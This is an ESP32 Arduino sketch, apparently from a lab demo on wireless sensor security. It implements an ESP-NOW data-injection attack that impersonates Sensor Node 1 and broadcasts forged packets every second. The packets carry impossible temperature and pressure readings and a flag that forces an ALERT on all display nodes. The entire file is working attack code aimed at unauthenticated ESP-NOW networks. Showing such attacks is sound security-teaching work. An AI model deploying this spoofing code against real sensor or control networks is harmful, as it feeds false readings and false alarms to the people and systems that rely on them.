// ============================================================
// PHASE 1 - ATTACK 2: DATA INJECTION / SPOOFING
// Upload to the 5th (attack) ESP32
// Open Serial Monitor at 115200 baud
// Watch: Display nodes will show fake data and *** ALERT ***
// ============================================================

#include <esp_now.h>
#include <WiFi.h>

// Message structure - must match Sender.ino exactly
typedef struct {
    int   senderID;
    float temp;
    float pressure;
    int   button;
    int   command;
} Message;

Message fakeMsg;
uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
long injectedCount = 0;

// Callback to confirm packet was sent
void OnDataSent(const uint8_t* mac_addr, esp_now_send_status_t status) {
    injectedCount++;
    Serial.print("[INJECTED] Packet #");
    Serial.print(injectedCount);
    Serial.print("  senderID=1  temp=999.9  pressure=666.6  button=1");
    Serial.println(status == ESP_NOW_SEND_SUCCESS ? "  [SENT OK]" : "  [FAIL]");
}

void setup() {
    Serial.begin(115200);
    delay(500);

    Serial.println("");
    Serial.println("============================================");
    Serial.println("  ESP-NOW INJECTION ATTACK");
    Serial.println("  Attack Demo - Phase 1");
    Serial.println("  Impersonating Sensor Node 1");
    Serial.println("============================================");
    Serial.println("");

    WiFi.mode(WIFI_STA);
    esp_now_init();
    esp_now_register_send_cb(OnDataSent);

    // Add broadcast peer
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, broadcastAddress, 6);
    peer.channel = 0;
    peer.encrypt = false;
    esp_now_add_peer(&peer);

    Serial.println("[*] Injection node ready.");
    Serial.println("[*] Sending fake packets claiming to be Sensor Node 1...");
    Serial.println("[*] Watch display nodes show 999.9C and ALERT!");
    Serial.println("");
}

void loop() {
    // Claim to be Sensor Node 1
    fakeMsg.senderID = 1;

    // Inject physically impossible values
    fakeMsg.temp     = 999.9;   // Impossible temperature
    fakeMsg.pressure = 666.6;   // Anomalous pressure
    fakeMsg.button   = 1;       // Force ALERT on all display nodes
    fakeMsg.command  = 0;

    esp_now_send(broadcastAddress, (uint8_t*)&fakeMsg, sizeof(fakeMsg));

    delay(1000);  // Inject every 1 second
}
